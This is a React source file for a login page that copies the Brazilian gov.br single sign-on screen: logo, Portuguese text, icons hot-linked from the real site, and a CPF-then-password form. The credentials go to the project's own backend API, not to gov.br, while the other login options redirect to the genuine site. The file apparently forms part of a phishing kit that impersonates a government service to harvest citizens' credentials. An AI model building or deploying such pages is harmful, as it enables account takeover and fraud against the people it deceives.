import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { login } from '../services/api';
import './LoginPage.css';

export default function LoginPage() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [cpf, setCpf] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // CPF mask: 000.000.000-00
  const applyCpfMask = (value) => {
    const clean = value.replace(/\D/g, '').slice(0, 11);
    let masked = clean;
    if (clean.length > 3) masked = clean.slice(0, 3) + '.' + clean.slice(3);
    if (clean.length > 6) masked = masked.slice(0, 7) + '.' + clean.slice(6);
    if (clean.length > 9) masked = masked.slice(0, 11) + '-' + clean.slice(9);
    return masked;
  };

  const handleCpfChange = (e) => {
    setCpf(applyCpfMask(e.target.value));
  };

  const handleCpfSubmit = (e) => {
    e.preventDefault();
    const cleanCpf = cpf.replace(/\D/g, '');
    if (cleanCpf.length === 11) {
      setStep(2);
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    if (isLoading) return;
    setIsLoading(true);
    setErrorMsg('');

    const cleanCpf = cpf.replace(/\D/g, '');

    try {
      const route = await login(cleanCpf, password);
      navigate(route);
    } catch (err) {
      setErrorMsg(err.message);
      setIsLoading(false);
    }
  };

  const handleCancel = () => {
    setPassword('');
    setShowPassword(false);
    setErrorMsg('');
    setStep(1);
  };

  const handleKeyPressPassword = (e) => {
    if (e.key === 'Enter') {
      handleLogin(e);
    }
  };

  const redirectToSso = () => {
    window.location.href = 'https://sso.acesso.gov.br/login';
  };

  // Display CPF as formatted (like real gov.br shows: 149.488.226-47)
  const displayCpf = cpf;

  return (
    <div className="gov-login-container">
      <header className="gov-header">
          <div className="gov-header-logo" onClick={() => navigate('/')} style={{cursor: 'pointer'}}>
            <img src="/govbr-logo.png" alt="Logomarca GovBR" />
          </div>
        <div className="gov-header-actions">
          <span>
            <a href="#" onClick={(e) => e.preventDefault()}>
              <i className="fas fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="https://www.vlibras.gov.br">
              <i className="fas fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <main className="gov-main-desktop">

        {/* LEFT COLUMN */}
        <div className="gov-left-column">
          {step === 1 ? (
            <div className="gov-promo-banner">
              <img src="/conta_govbr_v2.jpg" alt="gov.br banner" className="gov-promo-img-direct" />
            </div>
          ) : (
            <div className="gov-step2-banner">
              <div className="gov-step2-card">
                <img src="/senha.png" alt="Logomarca GovBR" className="gov-step2-img-direct" />
                <p className="gov-step2-text">Digite sua senha para acessar o login único do governo federal.</p>
              </div>
            </div>
          )}
        </div>

        {/* RIGHT COLUMN */}
        <div className="gov-right-column">
          <div className="gov-card">
            {step === 1 && (
              <>
                <h3 className="gov-card-title">Identifique-se no gov.br com:</h3>

                <div className="gov-cpf-badge">
                  <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png" alt="" />
                  Número do CPF
                </div>

                <p className="gov-subtitle">
                  Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
                </p>

                <form onSubmit={handleCpfSubmit}>
                  <label className="gov-label">CPF</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    className="gov-input"
                    placeholder="Digite seu CPF"
                    value={cpf}
                    onChange={handleCpfChange}
                    autoComplete="new-password"
                    required
                  />

                  <div className="gov-button-panel gov-button-panel-end">
                    <button type="submit" className="gov-btn-primary">
                      Continuar
                    </button>
                  </div>
                </form>

                <label className="gov-divider-text">Outras opções de identificação:</label>
                <hr className="gov-divider-line" />

                <div className="gov-options-list">
                  <div className="gov-option-item">
                    <button type="button" className="gov-option-btn gov-option-green" onClick={redirectToSso}>
                      <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" alt="" />
                      Login com seu banco
                      <span className="gov-badge-green">SUA CONTA SERÁ PRATA</span>
                    </button>
                  </div>

                  <div className="gov-option-item">
                    <a href="https://sso.acesso.gov.br/login" className="gov-option-btn">
                      <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/qrcode.png" alt="" />
                      Login com QR code
                    </a>
                  </div>

                  <div className="gov-option-item">
                    <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                      <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" alt="" />
                      Seu certificado digital
                    </button>
                  </div>

                  <div className="gov-option-item">
                    <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                      <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" alt="" />
                      Seu certificado digital em nuvem
                    </button>
                  </div>
                </div>

                <div className="gov-help-links">
                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br">
                    <img src="https://sso.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" alt="" className="gov-help-icon" />
                    Está com dúvidas e precisa de ajuda?
                  </a>
                  <a href="https://cadastro.acesso.gov.br/termo-de-uso">
                    Termo de Uso e Aviso de Privacidade
                  </a>
                </div>
              </>
            )}

            {step === 2 && (
              <>
                <h3 className="gov-card-title">Digite sua senha</h3>

                <div className="gov-user-info">
                  <label className="gov-label">CPF</label>
                  <h4 className="gov-cpf-display">{displayCpf}</h4>
                </div>

                <form onSubmit={handleLogin}>
                  <label className="gov-label" htmlFor="password">Senha</label>
                  <div className="gov-password-wrapper">
                    <input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      className="gov-input"
                      placeholder="Digite sua senha atual"
                      value={password}
                      onChange={(e) => { setPassword(e.target.value); setErrorMsg(''); }}
                      onKeyPress={handleKeyPressPassword}
                      autoComplete="new-password"
                      autoFocus
                      required
                    />
                    <span
                      className="toggle-password fa fa-fw fa-eye"
                      onClick={() => setShowPassword(!showPassword)}
                      tabIndex={2}
                    ></span>
                  </div>

                  {errorMsg && (
                    <div style={{color: 'var(--clr-danger)', marginTop: '8px', fontSize: '0.875rem', fontWeight: 600}}>
                      <i className="fa-solid fa-circle-exclamation" style={{marginRight: 4}}></i> {errorMsg}
                    </div>
                  )}

                  <div className="gov-actions-column">
                    <div className="gov-button-panel gov-button-panel-between">
                      <button
                        type="button"
                        className="gov-btn-outline"
                        onClick={handleCancel}
                      >
                        Cancelar
                      </button>
                      <button
                        type="submit"
                        className={`gov-btn-primary${isLoading ? ' gov-btn-loading' : ''}`}
                        disabled={isLoading}
                      >
                        Entrar
                      </button>
                    </div>
                    <button
                      type="button"
                      className="gov-forgot-link"
                      onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}
                    >
                      Esqueci minha senha
                    </button>
                  </div>
                </form>
              </>
            )}
          </div>

          {step === 2 && (
            <div className="gov-card gov-card-faq">
              <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/">
                Ficou com dúvidas?
              </a>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
